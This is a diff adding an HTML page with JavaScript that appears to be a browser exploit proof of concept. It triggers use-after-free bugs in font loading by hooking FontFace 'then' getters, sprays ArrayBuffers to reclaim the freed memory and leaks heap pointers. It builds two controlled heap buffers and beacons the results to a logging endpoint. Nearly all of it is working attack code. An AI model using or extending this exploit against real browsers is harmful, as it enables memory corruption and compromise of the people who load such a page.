@@ -1,0 +1,274 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p1104</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:12px/1.5 monospace;padding:12px;min-height:100vh}#log{white-space:pre-wrap;word-break:break-all}.hit{color:#ff6;font-weight:bold}.ptr{color:#f6f;font-weight:bold}.fail{color:#f66}.ok{color:#6f6}.info{color:#6cf}.crit{color:#f00;font-weight:bold;font-size:13px}.win{color:#0f0;font-weight:bold;font-size:14px}.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}</style>
+</head><body>
+<div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);L.scrollTop=L.scrollHeight;}
+function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
+function hex(v){return'0x'+v.toString(16);}
+
+B('P1104-BOOT','');
+log('phase','P1104: DUAL UAF — two independent controlled buffers');
+
+// ============================================================
+// UAF #1: Proven trigger via document.fonts.load()
+// ============================================================
+var SIZES=[64,96,128,160,192,224,256,320,384,512,768,1024,2048];
+var K=8;
+
+var st1=document.createElement('style');
+st1.textContent="@font-face{font-family:s0;src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(st1);
+var f0=new FontFace('f0','local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(f0);void f0.loaded;
+
+var fired1=false,map1=null,buf1=null,ptrs1=null,idx1=-1,patched1=false;
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+  if(fired1)return undefined;fired1=true;
+  if(st1)st1.remove();try{document.fonts.delete(this);}catch(e){}
+  document.body.offsetHeight;
+  map1=[];
+  for(var si=0;si<SIZES.length;si++){
+    var sz=SIZES[si];
+    for(var k=0;k<K;k++){map1.push({size:sz,ab:new ArrayBuffer(sz),idx:si*K+k});}
+  }
+  try{document.fonts.check('1em s0');}catch(e){}
+  return undefined;
+},set:function(){}});
+document.fonts.load('1em f0, s0','AB').then(function(){},function(){});
+
+// Poll for UAF1
+for(var t=15;t<=200;t+=5){(function(ms){setTimeout(function(){
+  if(patched1||!map1)return;
+  for(var bi=32;bi<40;bi++){
+    if(!map1[bi])continue;
+    var b=new BigUint64Array(map1[bi].ab);
+    var nz=0;for(var q=0;q<b.length;q++)if(b[q]!==0n)nz++;
+    if(nz>0&&!patched1){
+      patched1=true;buf1=b;idx1=bi;
+      ptrs1=[];
+      for(var q=0;q<b.length;q++)if(b[q]!==0n)ptrs1.push({off:q*8,val:b[q]});
+      b[0]=0x100n;
+      B('P1104-UAF1','buf='+bi+'|ms='+ms+'|'+ptrs1.map(function(p){return'+'+hex(p.off)+'='+hex(p.val);}).join(','));
+    }
+  }
+},ms);})(t);}
+
+// ============================================================
+// UAF #2: Triggered via FontFace.loaded (confirmed by P1103v3)
+// After UAF1 stabilizes, set up a SECOND CSS font and free it
+// using a fresh .then getter that fires via FontFace.loaded
+// ============================================================
+setTimeout(function(){
+  if(!patched1){B('P1104-NOHIT1','');return;}
+  log('ok','UAF1 stable: buf#'+idx1);
+  log('ptr','  '+ptrs1.map(function(p){return hex(p.off)+'='+hex(p.val);}).join(', '));
+
+  // Save UAF1 pointer values for comparison
+  var ptr1_58=0n,ptr1_68=0n;
+  for(var i=0;i<ptrs1.length;i++){
+    if(ptrs1[i].off===0x58)ptr1_58=ptrs1[i].val;
+    if(ptrs1[i].off===0x68)ptr1_68=ptrs1[i].val;
+  }
+
+  log('','');
+  log('phase','Setting up UAF #2 via FontFace.loaded...');
+
+  // Create SECOND CSS @font-face
+  var st2=document.createElement('style');
+  st2.textContent="@font-face{font-family:s2;src:local(Courier);unicode-range:U+0043;}";
+  document.head.appendChild(st2);
+
+  // Create a JS FontFace whose .loaded Promise will resolve
+  // The resolution checks .then on the FontFace → our getter fires
+  var fired2=false,map2=null,buf2=null,ptrs2=null,idx2=-1,patched2=false;
+
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+    if(fired2)return undefined;fired2=true;
+    // Delete the SECOND CSS font (s2), not this JS font
+    if(st2)st2.remove();
+    // Also try to delete the CSS font from fonts set
+    // We need to find it — iterate fonts
+    try{
+      document.fonts.forEach(function(ff){
+        if(ff.family==='s2'){
+          try{document.fonts.delete(ff);}catch(e){}
+        }
+      });
+    }catch(e){}
+    document.body.offsetHeight;
+
+    // Spray for UAF2 — use DIFFERENT buffer set
+    map2=[];
+    for(var si=0;si<SIZES.length;si++){
+      var sz=SIZES[si];
+      for(var k=0;k<K;k++){map2.push({size:sz,ab:new ArrayBuffer(sz),idx:si*K+k});}
+    }
+    try{document.fonts.check('1em s2');}catch(e){}
+
+    // Inline scan for reclaim
+    for(var bi=32;bi<40;bi++){
+      if(!map2[bi])continue;
+      var b=new BigUint64Array(map2[bi].ab);
+      var nz=0;for(var q=0;q<b.length;q++)if(b[q]!==0n)nz++;
+      if(nz>0){
+        patched2=true;buf2=b;idx2=bi;
+        ptrs2=[];
+        for(var q=0;q<b.length;q++)if(b[q]!==0n)ptrs2.push({off:q*8,val:b[q]});
+        b[0]=0x100n;
+        B('P1104-UAF2-INLINE','buf='+bi+'|'+ptrs2.map(function(p){return'+'+hex(p.off)+'='+hex(p.val);}).join(','));
+        break;
+      }
+    }
+    return undefined;
+  },set:function(){}});
+
+  // Trigger via FontFace.loaded
+  // Create a new JS FontFace, add to fonts, load it
+  var trigFont=new FontFace('trigF','local(Arial)',{unicodeRange:'U+0043'});
+  document.fonts.add(trigFont);
+  trigFont.load();
+  // The .loaded promise resolves with trigFont → checks .then → our getter fires
+
+  // Poll for UAF2 (in case inline scan missed it)
+  for(var t2=15;t2<=300;t2+=5){(function(ms){setTimeout(function(){
+    if(patched2||!map2)return;
+    for(var bi=32;bi<40;bi++){
+      if(!map2[bi])continue;
+      var b=new BigUint64Array(map2[bi].ab);
+      var nz=0;for(var q=0;q<b.length;q++)if(b[q]!==0n)nz++;
+      if(nz>0&&!patched2){
+        patched2=true;buf2=b;idx2=bi;
+        ptrs2=[];
+        for(var q=0;q<b.length;q++)if(b[q]!==0n)ptrs2.push({off:q*8,val:b[q]});
+        b[0]=0x100n;
+        B('P1104-UAF2-POLL','buf='+bi+'|ms='+ms+'|'+ptrs2.map(function(p){return'+'+hex(p.off)+'='+hex(p.val);}).join(','));
+      }
+    }
+  },ms);})(t2);}
+
+  // ============================================================
+  // Analysis: compare the two UAF buffers
+  // ============================================================
+  setTimeout(function(){
+    if(!patched2){
+      // Try alternate: FontFaceSet.ready trigger
+      log('fail','UAF2 via FontFace.loaded: no reclaim');
+      log('phase','Trying UAF2 via FontFaceSet.ready...');
+
+      var st3=document.createElement('style');
+      st3.textContent="@font-face{font-family:s3;src:local(Times);unicode-range:U+0044;}";
+      document.head.appendChild(st3);
+
+      var fired3=false;
+      try{
+        var fsp=Object.getPrototypeOf(document.fonts);
+        Object.defineProperty(fsp,'then',{configurable:true,get:function(){
+          if(fired3)return undefined;fired3=true;
+          if(st3)st3.remove();
+          try{document.fonts.forEach(function(ff){
+            if(ff.family==='s3')try{document.fonts.delete(ff);}catch(e){}
+          });}catch(e){}
+          document.body.offsetHeight;
+          map2=[];
+          for(var si=0;si<SIZES.length;si++){
+            var sz=SIZES[si];
+            for(var k=0;k<K;k++){map2.push({size:sz,ab:new ArrayBuffer(sz),idx:si*K+k});}
+          }
+          try{document.fonts.check('1em s3');}catch(e){}
+          for(var bi=32;bi<40;bi++){
+            if(!map2[bi])continue;
+            var b=new BigUint64Array(map2[bi].ab);
+            var nz=0;for(var q=0;q<b.length;q++)if(b[q]!==0n)nz++;
+            if(nz>0){
+              patched2=true;buf2=b;idx2=bi;ptrs2=[];
+              for(var q=0;q<b.length;q++)if(b[q]!==0n)ptrs2.push({off:q*8,val:b[q]});
+              b[0]=0x100n;
+              B('P1104-UAF2-READY','buf='+bi+'|'+ptrs2.map(function(p){return'+'+hex(p.off)+'='+hex(p.val);}).join(','));
+              break;
+            }
+          }
+          return undefined;
+        },set:function(){}});
+        void document.fonts.ready;
+      }catch(e){log('fail','ready error: '+e.message);}
+    }
+
+    // Final analysis at 2s
+    setTimeout(function(){
+      if(!patched2){
+        B('P1104-NOHIT2','uaf2 failed');
+        log('fail','UAF2 failed — no reclaim on any trigger');
+        B('P1104-DONE','uaf1=ok|uaf2=fail');
+        return;
+      }
+
+      log('','');
+      log('win','DUAL UAF ACHIEVED!');
+      log('ok','UAF1: buf#'+idx1);
+      log('ok','UAF2: buf#'+idx2);
+      log('ptr','UAF1: '+ptrs1.map(function(p){return hex(p.off)+'='+hex(p.val);}).join(', '));
+      log('ptr','UAF2: '+ptrs2.map(function(p){return hex(p.off)+'='+hex(p.val);}).join(', '));
+
+      // Compare pointers
+      var ptr2_58=0n,ptr2_68=0n;
+      for(var i=0;i<ptrs2.length;i++){
+        if(ptrs2[i].off===0x58)ptr2_58=ptrs2[i].val;
+        if(ptrs2[i].off===0x68)ptr2_68=ptrs2[i].val;
+      }
+
+      if(ptr1_58!==0n&&ptr2_58!==0n){
+        var d58=ptr2_58>ptr1_58?ptr2_58-ptr1_58:ptr1_58-ptr2_58;
+        log('ptr','Delta +0x58: '+hex(d58)+' ('+(ptr2_58>ptr1_58?'+':'-')+')');
+      }
+      if(ptr1_68!==0n&&ptr2_68!==0n){
+        var d68=ptr2_68>ptr1_68?ptr2_68-ptr1_68:ptr1_68-ptr2_68;
+        log('ptr','Delta +0x68: '+hex(d68)+' ('+(ptr2_68>ptr1_68?'+':'-')+')');
+      }
+
+      // Test cross-buffer access
+      log('','');
+      log('phase','Cross-buffer tests:');
+
+      // A: Are the two buffers independent?
+      var marker1=0xAAAA1111BBBB2222n;
+      var marker2=0xCCCC3333DDDD4444n;
+      buf1[1]=marker1;
+      buf2[1]=marker2;
+      var cross1=buf1[1]===marker1;
+      var cross2=buf2[1]===marker2;
+      var overlap=buf1[1]===marker2||buf2[1]===marker1;
+      log('info','Independent: '+(cross1&&cross2&&!overlap?'YES':'NO (OVERLAP!)'));
+      if(overlap)log('crit','BUFFERS OVERLAP! buf1[1]='+hex(buf1[1])+' buf2[1]='+hex(buf2[1]));
+
+      // B: Read all 4 leaked heap pointers
+      log('info','Heap pointers: '+hex(ptr1_58)+', '+hex(ptr1_68)+', '+hex(ptr2_58)+', '+hex(ptr2_68));
+
+      // C: Dump both buffers fully
+      var dump1=[],dump2=[];
+      for(var q=0;q<buf1.length;q++){
+        if(buf1[q]!==0n&&q!==0&&q!==1)dump1.push('+'+hex(q*8)+'='+hex(buf1[q]));
+      }
+      for(var q=0;q<buf2.length;q++){
+        if(buf2[q]!==0n&&q!==0&&q!==1)dump2.push('+'+hex(q*8)+'='+hex(buf2[q]));
+      }
+
+      // Restore markers
+      buf1[1]=0n;buf2[1]=0n;
+
+      var sum='uaf1='+idx1+'|uaf2='+idx2+'|overlap='+overlap;
+      sum+='|p1_58='+hex(ptr1_58)+'|p1_68='+hex(ptr1_68);
+      sum+='|p2_58='+hex(ptr2_58)+'|p2_68='+hex(ptr2_68);
+      B('P1104-DUAL',sum);
+      B('P1104-DONE','dual=true|overlap='+overlap);
+
+      log('','');
+      log('phase','=== P1104 DONE ===');
+      log('win','Two independent 192-byte controlled heap buffers!');
+      log('win','4 heap pointer leaks total');
+    },2000);
+  },1500);
+},800);
+</script>
+</body></html>
